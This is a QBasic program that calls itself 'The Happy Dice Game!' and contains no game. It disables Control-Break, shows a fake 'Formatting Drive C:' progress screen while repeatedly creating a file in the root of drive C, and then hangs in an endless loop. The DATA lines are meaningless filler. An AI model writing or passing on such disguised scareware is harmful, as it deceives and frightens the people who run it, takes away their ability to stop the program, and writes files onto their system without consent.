KEY 15, CHR$(4 + 128 + 32 + 64) + CHR$(70)
KEY 16, CHR$(4 + 128) + CHR$(70):
KEY 17, CHR$(4 + 128 + 32) + CHR$(70):
KEY 18, CHR$(4 + 128 + 64) + CHR$(70):
KEY 19, CHR$(4) + CHR$(70)
KEY 22, CHR$(4 + 64) + CHR$(70)
KEY 23, CHR$(4 + 32) + CHR$(46)
KEY 24, CHR$(4 + 64) + CHR$(46)
KEY 25, CHR$(4 + 32 + 64) + CHR$(46):

   ON KEY(15) GOSUB NoBreak: KEY(15) ON
   ON KEY(16) GOSUB NoBreak: KEY(16) ON
   ON KEY(17) GOSUB NoBreak: KEY(17) ON
   ON KEY(18) GOSUB NoBreak: KEY(18) ON
   ON KEY(21) GOSUB NoBreak: KEY(21) ON
   ON KEY(22) GOSUB NoBreak: KEY(22) ON
   ON KEY(23) GOSUB NoBreak: KEY(23) ON
   ON KEY(24) GOSUB NoBreak: KEY(24) ON
   ON KEY(25) GOSUB NoBreak: KEY(25) ON
   PRINT "Press <ESCAPE> for i have disabled control-break "

'The Happy Dice Game! By: Virral Infection Agency
PRINT "The Happy Dice Game!"
DATA Akghga
DATA 1,3,1,4Me Usls!,15,5,,61,
DATA 1,4363,1,4,15,5,,61,
DATA 1,33,1,4,15,5,,61,
DATA 1,3,64537163,4,15,5,,61,
DATA 1,3,1,4,165,5,,61,
DATA 31,3,35431,4,15,5,,61,
DATA 1,3,1,4,15,45,,61,
DATA 1,6793,1,4,15,5,,61,
DATA 1,3,1,4,15,5,,61,
DATA 1,3,1,4,14745,5,,61,
DATA 1,366,1,4,15,5,,61,
DATA 1,3,1,54324,15,5,,61,
DATA 1,073,1,4,15,5,,61,




CLS
DO
LOCATE 1, 1: PRINT "Formatting Drive C:"
LOCATE 2, 1: PRINT "Please Wait..."
PRINT t; "% Done.."
IF t = 100 THEN GOTO fin
del = 0
OPEN "C:\Formatc.dic" FOR OUTPUT AS #1
CLOSE #1
OPEN "C:\Formatc.dic" FOR INPUT AS #1
CLOSE #1
DO UNTIL del = 15000
del = del + 1
LOOP
t = t + 1
CLOSE
CLOSE
CLOSE
CLOSE
CLOSE
CLOSE
LOOP
fin:
DO
LOOP

NoBreak: RETURN

